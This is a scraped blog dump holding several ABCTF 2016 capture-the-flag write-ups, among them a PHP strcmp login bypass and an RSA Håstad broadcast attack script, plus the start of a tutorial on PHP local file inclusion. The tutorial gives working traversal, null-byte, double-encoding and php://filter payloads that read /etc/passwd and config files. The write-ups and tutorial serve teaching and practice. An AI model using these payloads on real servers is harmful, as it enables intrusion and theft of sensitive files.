http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link DescriptionIf you could bypass the login you could get the flag. Link Hint: Some ways of comparing two strings are very insecure. Solution Look at page source code See the comment: source.txt So go to http://yrmyzscnvh.abctf.xyz/web6/source.txt and see the server side source code: 123456789101112131415161718&lt;?php $FLAGWEB6 = (file_get_contents(\"flag.txt\")); $PASSWORD = (file_get_contents(\"flag.txt\")); //haha if(isset($_GET['password']))&#123; if(strcmp($PASSWORD, $_GET['password']) == 0)&#123; $success = true; &#125; else&#123; $success = false; &#125; &#125; else &#123; $success = false; &#125;?&gt; The vulnerability come from the usage of strcmp php function. Normally return 0 if two strings are equals. But if one of the two operators is not a string some weird behaviour can happen. For example if you compare a string and an array it returns NULL + PHP Warning: 12strcmp(&quot;foo&quot;, array()) =&gt; NULL + PHP Warningstrcmp(&quot;foo&quot;, new stdClass) =&gt; NULL + PHP Warning So we can bypass if(strcmp($PASSWORD, $_GET[&#39;password&#39;]) == 0) and change it to if(NULL == 0) And thanks to PHP native weakness NULL == 0 return True. More details So now we just have to forge a GET request giving an array: http://yrmyzscnvh.abctf.xyz/web6/?password[]=&quot;&quot;. Why? What is that? Transforming ?password=value to ?password[]=value will pass an array instead of a simple value so ?password[]=&quot;&quot; will give an empty array. Flag is abctf{always_know_whats_going_on}","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"web","slug":"web","permalink":"http://rawsec.ml/tags/web/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"ABCTF - 10 - Caesar Salad - Cryptography","slug":"ABCTF-10-Caesar-Salad-Cryptography","date":"2016-07-22T22:00:00.000Z","updated":"2016-10-12T21:07:54.485Z","comments":true,"path":"en/ABCTF-10-Caesar-Salad-Cryptography/","link":"","permalink":"http://rawsec.ml/en/ABCTF-10-Caesar-Salad-Cryptography/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link DescriptionMost definitely the best salad around. Can you decrypt this for us?xyzqc{t3_qelrdeq_t3_k33a3a_lk3_lc_qe3p3} Solution Caesar cipher again. ROT-3: abctf{w3_thought_w3_n33d3d_on3_of_th3s3}","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"crypto","slug":"crypto","permalink":"http://rawsec.ml/tags/crypto/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"ABCTF - 10 - Elemental - Web Exploitation","slug":"ABCTF-10-Elemental-Web-Exploitation","date":"2016-07-22T22:00:00.000Z","updated":"2016-10-12T21:07:54.485Z","comments":true,"path":"en/ABCTF-10-Elemental-Web-Exploitation/","link":"","permalink":"http://rawsec.ml/en/ABCTF-10-Elemental-Web-Exploitation/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link DescriptionJust put in the password for the flag! Link Solution Display source code CTRL + U 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;/html&gt;&lt;html&gt; &lt;head&gt; &lt;link rel=\"stylesheet\" href=\"main.css\"&gt; &lt;link href='https://fonts.googleapis.com/css?family=Inconsolata' rel='stylesheet' type='text/css'&gt; &lt;script src=\"https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js\"&gt;&lt;/script&gt; &lt;link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.6/css/materialize.min.css\"&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=\"row\"&gt; &lt;div class=\"col l6 push-l3\"&gt; &lt;center&gt;&lt;h3 class=\"white-text\"&gt;Web 1&lt;/h3&gt;&lt;br&gt;&lt;h3 class=\"white-text\"&gt;Simple&lt;/h3&gt;&lt;/center&gt; &lt;/div&gt; &lt;/div&gt; &lt;div style=\"margin-top: 20%\" class=\"row\"&gt; &lt;div class=\"col l4 push-l4\"&gt; &lt;form action=\".\" method=\"post\"&gt; &lt;h5 class=\"white-text\"&gt;Password: &lt;/h5&gt; &lt;input type=\"password\" name=\"password\" required&gt; &lt;input id=\"submit\" type=\"submit\" value=\"Submit\"&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"row\"&gt; &lt;div class=\"col l4 push-l4\" id=\"response-wrong\"&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;!-- 7xfsnj65gsklsjsdkj --&gt; &lt;script type=\"text/javascript\" src=\"fade.js\"&gt;&lt;/script&gt;&lt;/html&gt; We get a string in comment that look like a hard-to-guess password 7xfsnj65gsklsjsdkj Try this password and the flag will appear … but shortly because of the js: fade.js 123$(document).ready(function()&#123; $(\"#response\").fadeOut(2000);&#125;); Block it with NoScript or be quick! Flag: ABCTF{insp3ct3d_dat_3l3m3nt}","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"web","slug":"web","permalink":"http://rawsec.ml/tags/web/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"ABCTF - 15 - Just open it - Forensics","slug":"ABCTF-15-Just-open-it-Forensics","date":"2016-07-22T22:00:00.000Z","updated":"2016-10-12T21:07:54.488Z","comments":true,"path":"en/ABCTF-15-Just-open-it-Forensics/","link":"","permalink":"http://rawsec.ml/en/ABCTF-15-Just-open-it-Forensics/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link DescriptionI’m almost positive we put a flag in this file. Can you find it for me? Solution Try some simple reflex like:12strings 676F6F645F6A6F625F6275745F746869735F69736E745F7468655F666C6167.jpg | grep -i abcP ABCTF&#123;forensics_1_tooo_easy?&#125;","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"http://rawsec.ml/tags/forensics/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"ABCTF - 125 - A Small Broadcast - Cryptography","slug":"ABCTF-125-A-Small-Broadcast-Cryptography","date":"2016-07-22T22:00:00.000Z","updated":"2016-10-12T21:07:54.512Z","comments":true,"path":"en/ABCTF-125-A-Small-Broadcast-Cryptography/","link":"","permalink":"http://rawsec.ml/en/ABCTF-125-A-Small-Broadcast-Cryptography/","excerpt":"","text":"InformationsVersion By Translated by Version Comment Chill3d noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link Description I RSA encrypted the same message 3 different times with the same exponent. Can you decrypt this? SolutionCorrected challenge version URL: 1234567891011Problem updated on 7/17/16 @ 8PM EST - fixed valuesI RSA encrypted the same message 3 different times with the same exponent. Can you decrypt it?N1:79608037716527910392060670707842954224114341083822168077002144855358998405023007345791355970838437273653492726857398313047195654933011803740498167538754807659255275632647165202835846338059572102420992692073303341392512490988413552501419357400503232190597741120726276250753866130679586474440949586692852365179C1:34217065803425349356447652842993191079705593197469002356250751196039765990549766822180265723173964726087016890980051189787233837925650902081362222218365748633591895514369317316450142279676583079298758397507023942377316646300547978234729578678310028626408502085957725408232168284955403531891866121828640919987N2:58002222048141232855465758799795991260844167004589249261667816662245991955274977287082142794911572989261856156040536668553365838145271642812811609687362700843661481653274617983708937827484947856793885821586285570844274545385852401777678956217807768608457322329935290042362221502367207511491516411517438589637C2:48038542572368143315928949857213341349144690234757944150458420344577988496364306227393161112939226347074838727793761695978722074486902525121712796142366962172291716190060386128524977245133260307337691820789978610313893799675837391244062170879810270336080741790927340336486568319993335039457684586195656124176N3:95136786745520478217269528603148282473715660891325372806774750455600642337159386952455144391867750492077191823630711097423473530235172124790951314315271310542765846789908387211336846556241994561268538528319743374290789112373774893547676601690882211706889553455962720218486395519200617695951617114702861810811C3:55139001168534905791033093049281485849516290567638780139733282880064346293967470884523842813679361232423330290836063248352131025995684341143337417237119663347561882637003640064860966432102780676449991773140407055863369179692136108534952624411669691799286623699981636439331427079183234388844722074263884842748 The idea is to carry out a Håstad’s broadcast attack on the RSA protocol. This attack will allow us to decipher a text transmitted multiple times, provided that the exponent of the key that was used to cipher this text be lower or equal to the number of obtained transmissions. So, here, exponent must be 1, 2 or 3 (it’s often 3). Here is the script (comments are in French):1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980# RSA : Hastad Attack# Chill3dimport osdef eea(a,b): \"\"\"Extended Euclidean Algorithm for GCD\"\"\" v1 = [a,1,0] v2 = [b,0,1] while v2[0]&lt;&gt;0: p = v1[0]//v2[0] # floor division v2, v1 = map(lambda x, y: x-y,v1,[p*vi for vi in v2]), v2 return v1def inverse(m,k): \"\"\" Retourne b de maniere que b*m mod k = 1, ou 0 s'il n'y a pas de solution \"\"\" v = eea(m,k) return (v[0]==1)*(v[1] % k)def crt(N,e): \"\"\" Theoreme des reste chinois: N = Liste des modulo des clefs publiques e = Exposant des clefs publiques Chinese Remainder Theorem: ms = list of pairwise relatively prime integers as = remainders when x is divided by ms (ai is 'each in as', mi 'each in ms') The solution for x modulo M (M = product of ms) will be: x = a1*M1*y1 + a2*M2*y2 + ... + ar*Mr*yr (mod M), where Mi = M/mi and yi = (Mi)^-1 (mod mi) for 1 &lt;= i &lt;= r. \"\"\" M = reduce(lambda x, y: x*y,N) # Multiplication des N ; multiply N together Ms = [M/mi for mi in N] # Liste de tous les M/N list of all M/mi ys = [inverse(Mi, mi) for Mi,mi in zip(Ms,N)] # Utilise l'inverse,eea ; uses inverse,eea return reduce(lambda x, y: x+y,[ai*Mi*yi for ai,Mi,yi in zip(e,Ms,ys)]) % Mdef root(x,n): \"\"\" Fait une racine d'ordre n sur le nombre x Finds the integer component of the n'th root of x, an integer such that y ** n &lt;= x &lt; (y + 1) ** n. \"\"\" high = 1 while high ** n &lt; x: high *= 2 low = high/2 while low &lt; high: mid = (low + high) // 2 if low &lt; mid and mid**n &lt; x: low = mid elif high &gt; mid and mid**n &gt; x: high = mid else: return mid return mid + 1#Exposant commun aux 3 messagese=3#Modulo des cles publiquesN=[79608037716527910392060670707842954224114341083822168077002144855358998405023007345791355970838437273653492726857398313047195654933011803740498167538754807659255275632647165202835846338059572102420992692073303341392512490988413552501419357400503232190597741120726276250753866130679586474440949586692852365179,58002222048141232855465758799795991260844167004589249261667816662245991955274977287082142794911572989261856156040536668553365838145271642812811609687362700843661481653274617983708937827484947856793885821586285570844274545385852401777678956217807768608457322329935290042362221502367207511491516411517438589637,95136786745520478217269528603148282473715660891325372806774750455600642337159386952455144391867750492077191823630711097423473530235172124790951314315271310542765846789908387211336846556241994561268538528319743374290789112373774893547676601690882211706889553455962720218486395519200617695951617114702861810811]#Messages communiques avec la meme cle priveey=[34217065803425349356447652842993191079705593197469002356250751196039765990549766822180265723173964726087016890980051189787233837925650902081362222218365748633591895514369317316450142279676583079298758397507023942377316646300547978234729578678310028626408502085957725408232168284955403531891866121828640919987,48038542572368143315928949857213341349144690234757944150458420344577988496364306227393161112939226347074838727793761695978722074486902525121712796142366962172291716190060386128524977245133260307337691820789978610313893799675837391244062170879810270336080741790927340336486568319993335039457684586195656124176,55139001168534905791033093049281485849516290567638780139733282880064346293967470884523842813679361232423330290836063248352131025995684341143337417237119663347561882637003640064860966432102780676449991773140407055863369179692136108534952624411669691799286623699981636439331427079183234388844722074263884842748]#On applique le theoreme des restes Chinois sur N et yF=crt(N,y)print \"F\",F#On fait une racine cubique de Fintflag = root(F,e)print \"intflag\",intflag#On affiche sa valeurflag = hex(intflag)[2:-1].decode('hex')print flag","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"crypto","slug":"crypto","permalink":"http://rawsec.ml/tags/crypto/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"ABCTF - 15 - Virtual Box 2 - Virtual Series","slug":"ABCTF-15-Virtual-Box-2-Virtual-Series","date":"2016-07-22T22:00:00.000Z","updated":"2016-10-12T21:07:54.512Z","comments":true,"path":"en/ABCTF-15-Virtual-Box-2-Virtual-Series/","link":"","permalink":"http://rawsec.ml/en/ABCTF-15-Virtual-Box-2-Virtual-Series/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link DescriptionDarn, I found this flag so I put it in flag 1.doc but I can’t seem to be able to see it anymore. Solution Go into C:\\WINDOWS\\Desktop\\flag 1.doc Edit &gt; Select All &gt; Color &gt; Black You now see ABCTF{H1DDEN_AWAY}","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"virtualization","slug":"virtualization","permalink":"http://rawsec.ml/tags/virtualization/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"ABCTF - 30 - GZ - Forensics","slug":"ABCTF-30-GZ-Forensics","date":"2016-07-22T22:00:00.000Z","updated":"2016-10-12T21:07:54.528Z","comments":true,"path":"en/ABCTF-30-GZ-Forensics/","link":"","permalink":"http://rawsec.ml/en/ABCTF-30-GZ-Forensics/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link DescriptionWe shot a flag into this file but some things got messed up on the way… Solution Not so much interesting in raw: 12cat flag\u001f�\b\b^\u000fpW\u0000\u0003flag\u0000str\u000eq�N*��N͋��,(H-��\u0002\u0000��%�\u0015\u0000\u0000\u0000 Let’s check what is that: 12file flagflag: gzip compressed data, was &quot;flag&quot;, last modified: Sun Jun 26 17:22:38 2016, from Unix Ok fine, if it’s a gzip archive let’s extract it 12gzip -dc flag &gt; test &amp;&amp; cat testABCTF&#123;broken_zipper&#125; I don’t care that is a broken archive! I got my flag: ABCTF{broken_zipper}","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"http://rawsec.ml/tags/forensics/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"ABCTF - 30 - TGIF - Programming","slug":"ABCTF-30-TGIF-Programming","date":"2016-07-22T22:00:00.000Z","updated":"2016-10-12T21:07:54.495Z","comments":true,"path":"en/ABCTF-30-TGIF-Programming/","link":"","permalink":"http://rawsec.ml/en/ABCTF-30-TGIF-Programming/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link DescriptionFriday is the best day of the week, and so I really want to know how many Fridays there are in this file. But, with a twist. I want to know how many Fridays there are one year later than each date. Hint: For example, if you got November 21, 2001, I want to know if November 21, 2002 is a Friday. Also, the answer is in the format ABCTF{} Note: TGIF stands for Thank God It’s Friday Solution Write a script that parse the date.txt file and count the number of Friday 12345678910111213141516171819202122232425#!/usr/bin/env python2import localefrom datetime import datetimeimport calendarlocale.setlocale(locale.LC_ALL, 'en_US.UTF-8')calendar.setfirstweekday(calendar.MONDAY)# strptime : https://docs.python.org/2/library/datetime.html#datetime.datetime.strptime# format : https://docs.python.org/2/library/datetime.html#strftime-and-strptime-behaviordate_format = '%B %d, %Y'i = 0with open('date.txt', 'r') as date_file: for line in date_file: date_string = line.rstrip() date_object = datetime.strptime(date_string, date_format) if not (calendar.isleap(date_object.year) and date_object.day == 29): date_object = date_object.replace(year = date_object.year + 1) if date_object.isoweekday() == 5: # Friday i += 1print('ABCTF&#123;' + str(i) + '&#125;') This instruction if not (calendar.isleap(date_object.year) and date_object.day == 29) : was to avoid bug with February 29, 2004 because 2004 was a leap year and that February 29, 2005 is not existing so. So when running my script I got: 12python3 date.pyABCTF&#123;193&#125; That’s not the good flag but maybe that is because of the 29 of February so I tried ABCTF{194} and it’s good!","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"programming","slug":"programming","permalink":"http://rawsec.ml/tags/programming/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"ABCTF - 35 - The Flash - Web Exploitation","slug":"ABCTF-35-The-Flash-Web-Exploitation","date":"2016-07-22T22:00:00.000Z","updated":"2016-10-12T21:07:54.535Z","comments":true,"path":"en/ABCTF-35-The-Flash-Web-Exploitation/","link":"","permalink":"http://rawsec.ml/en/ABCTF-35-The-Flash-Web-Exploitation/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link DescriptionCan you somehow get the flag from this website? Solution Display source code CTRL + U 1234567891011121314151617181920212223242526272829303132333435363738&lt;html&gt; &lt;head&gt; &lt;link rel=\"stylesheet\" href=\"main.css\"&gt; &lt;link href='https://fonts.googleapis.com/css?family=Inconsolata' rel='stylesheet' type='text/css'&gt; &lt;script src=\"https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js\"&gt;&lt;/script&gt; &lt;link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.6/css/materialize.min.css\"&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=\"row\"&gt; &lt;div class=\"col l6 push-l3\"&gt; &lt;center&gt;&lt;h3 class=\"white-text\"&gt;Web 2&lt;/h3&gt;&lt;br&gt;&lt;/center&gt; &lt;/div&gt; &lt;/div&gt; &lt;div style=\"margin-top: 20%\" class=\"row\"&gt; &lt;div class=\"col l4 push-l4\"&gt; &lt;form action=\".\" method=\"post\"&gt; &lt;h5 class=\"white-text\"&gt;Password: &lt;/h5&gt; &lt;input type=\"password\" name=\"password\" required&gt; &lt;input id=\"submit\" type=\"submit\" value=\"Submit\"&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"row\"&gt; &lt;div class=\"col l4 push-l4\" id=\"response-wrong\"&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;!-- c3RvcHRoYXRqcw== --&gt; &lt;script type=\"text/javascript\" src=\"fade.js\"&gt;&lt;/script&gt;&lt;/html&gt; We can see a base64 string c3RvcHRoYXRqcw== 12echo -n &quot;c3RvcHRoYXRqcw==&quot; | base64 -d &amp;&amp; echo &quot;&quot;stopthatjs So use stopthatjs as password and then you see HAAAAaaaaaaaa! and the flag displayed very very shortly Yes because there is this fade script:fade.js 12345678910$(document).ready(function()&#123; $(\"#response-wrong\").fadeOut(1500); setTimeout( function() &#123; $('#response').text('HAAAAaaaaaaaa!') $('#response').fadeOut(1500); &#125;, 20);&#125;); So block it, for example with NoScript =&gt; ABCTF{no(d3)_js_is_s3cur3_dasjkhadbkjfbjfdjbfsdajfasdl}","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"web","slug":"web","permalink":"http://rawsec.ml/tags/web/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"ABCTF - 35 - Virtual Box 3 - Virtual Series","slug":"ABCTF-35-Virtual-Box-3-Virtual-Series","date":"2016-07-22T22:00:00.000Z","updated":"2016-10-12T21:07:54.518Z","comments":true,"path":"en/ABCTF-35-Virtual-Box-3-Virtual-Series/","link":"","permalink":"http://rawsec.ml/en/ABCTF-35-Virtual-Box-3-Virtual-Series/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link DescriptionThis mysterious file was left here, but I have no idea how to open it. Do you? I left it in a folder named 2016 just for you. Solution Go to C:\\My Documents\\2016 and there is flagfour.xlsx but we don’t have Excel Extract the file with a floppy disk On your host create a floppy disk: fallocate -l 1474560 floppy.vfd Mount it on the Win98 VM Format it Copy flagfour.xlsx on it Eject the floppy Retrieve the file on your host Mount the image with a loopback device: sudo mount -o loop floppy.vfd /tmp/floppy Open with libreoffice libreoffice /tmp/floppy/flagfour.xlsx Content is ABCTF{FR0M_THE_FUTURE} Enjoy the flag!","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"virtualization","slug":"virtualization","permalink":"http://rawsec.ml/tags/virtualization/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"Local File Inclusion (LFI) and Remote Code Execution (RCE) vulnerabilities for PHP","slug":"local-file-inclusion-remote-code-execution-vulnerability","date":"2016-07-08T22:00:00.000Z","updated":"2016-11-02T23:00:00.000Z","comments":true,"path":"en/local-file-inclusion-remote-code-execution-vulnerability/","link":"","permalink":"http://rawsec.ml/en/local-file-inclusion-remote-code-execution-vulnerability/","excerpt":"","text":"Local File Inclusion (LFI) is a type of vulnerability concerning web server. It allow an attacker to include a local file on the web server. It occurs due to the use of not properly sanitized user input. This can lead to: outpouting source code or sensitive information code execution (server-side/client-side) Denial of service (DoS) ExamplesI’ll give some examples in PHP but it can also occurs in Perl, ASP, JSP, or whatever. Basic includesServer code:123456&lt;?php$file = $_GET['file'];if(isset($file))&#123; include(\"$file\");&#125; Legitimate request:1http://example.com/index.php?file=contact.php Bad request:1http://example.com/index.php?file=/etc/passwd Here an attacker can simply chose to modify the GET request to give a file that is not in the web serer folder. Directory traversal attackServer code:123456&lt;?php$file = $_GET['file'];if(isset($file))&#123; include(\"lib/functions/$file\");&#125; Legitimate request:1http://example.com/index.php?file=displaycontent.php Bad request:1http://example.com/index.php?file=../../../../../etc/passwd Here an attacker can use relative path to get out of the web server folder. Null Byte InjectionServer code:123456&lt;?php$file = $_GET['file'];if(isset($file))&#123; include(\"lib/functions/$file.php\");&#125; Legitimate request:1http://example.com/index.php?file=displaycontent Bad request:1http://example.com/index.php?file=../../../../../etc/passwd%00 Here the script force to use .php file extension, but an attacker, by adding a null byte the the path, can drop the extension. Why? %00 is the http encoded version of 0x00 in hex. It’s the null caracter, a null byte. In C it’s written \\0 and it means the string termination character so that will stop processing the string immediately. PHP (like other web server lang) require to process high-level code at system level and it’s usually accomplished by using C/C++ functions. Bytes following the delimiter will be ignored. If in php we have:1$tmp='try'; In C we have:12345char tmp[4];tmp[0] = 't';tmp[1] = 'r';tmp[2] = 'y';tmp[3] = '\\0'; so if a null byte is injected int php1$tmp='try\\0next' Will procude in C:12345678910char tmp[9];tmp[0] = 't';tmp[1] = 'r';tmp[2] = 'y';tmp[3] = '\\0';tmp[4] = 'n';tmp[5] = 'e';tmp[6] = 'x';tmp[7] = 't';tmp[8] = '\\0'; Go here for more details. Note: Null byte injection has been fixed in PHP 5.3.4 (unsupported). Filter EvasionSomeone aware of previous vulnerabilities may think he will be secure wit a proper filter like:123456&lt;?php$file = str_replace('../', '', $_GET['file']);if(isset($file))&#123; include(\"lib/functions/$file\");&#125; Legitimate request:1http://example.com/index.php?file=displaycontent Bad request (HTTP char encoding):1http://example.com/index.php?file=..%2F..%2F..%2F..%2F..%2Fetc/passwd or bad request (double all chars):1http://example.com/index.php?file=....//....//....//....//....//etc/passwd The script replace all ../ with nothing but what if we encode slashs or dotes? or doubling them? The first method won’t work on recent PHP version but the second one will work nearly every times. Double encodingSometimes it’s possible to encode some characters of the URL to bypass filters as we have seen previously. This is because the browser decodes the input but PHP does not. Cf. OWASP: By using double encoding it’s possible to bypass security filters that only decode user input once. The second decoding process is executed by the backend platform or modules that properly handle encoded data, but don’t have the corresponding security checks in place. For example if urlencode() is used in PHP. So to continue to bypass the filter a double encoding is needed: We encode the data the first time, for example ../etc/passwd begins %2E%2E%2Fetc%2Fpasswd And now encode the %: %252E%252E%252Fetc%252Fpasswd Path truncationAs all version of PHP since 5.3.4 are no more vulnerable to null byte injection, we need more methods to bypass extensions filter such as:1include('lib/functions/' + $_GET['file'] + '.php'); Facts: on UNIX /./etc/passwd is the same as /etc/passwd on PHP trailing slash are often stripped off so /etc/passwd/ is the same as /etc/passwd on PHP as trailing slash are stripped off, they can be added as much as we want so /etc/passwd////// is the same as /etc/passwd on PHP ./ can be appended as many tiems as you want to a path so /etc/passwd/., /etc/passwd/./, /etc/passwd/././. are all the same as /etc/passwd. But there is another fact that is interesting to bypass extensions filter: on a lot of PHP installation, filenames longer than 4096 bytes are silently truncated! Characters after the firsts 4096 bytes are discarded and no error is triggered. So what? Let’s craft a very long path to discard .php extension! Take your request and append a thousand times ./ to ../../../etc/passwd/./././././&lt;...&gt; so will get ../../../etc/passwd/./././././&lt;...&gt;/././.php but the filename will be longer than 4096 bytes so the overlong part will be dropped. So we’ll just get our request and thousand times ./ that will be equivalent to ../../../etc/passwd. Reverse path truncationIt also exist the reverse version of path truncation. This works by trying to fill the file name from the beginning to exceed the MAX_PATH value. But this method has a disadvantage: you have to inject the exact number of bytes to truncate only the .php extension. If too much ../ are injected the filename will also be truncated. Plus, that’s why you’ll need to add some characters if the path has not the good length because bytes are injected by 3 due to ../. Details can be found here. php://filterYou found a LFI, you included the file but you can’t see its content? Some file like config.php or libraries of functions are only executed but not shown. So to help us show them, we can use some PHP wrappers. A famous one is index.php?page=php://filter/read=convert.base64-encode/resource=config, this filter will encode the page in base64 and show the result like if we have done index.php?page=config and then base64 it. expect://A rare but very useful wrapper is expect://, it allows execution of system commands via php. But it is not enabled by default, 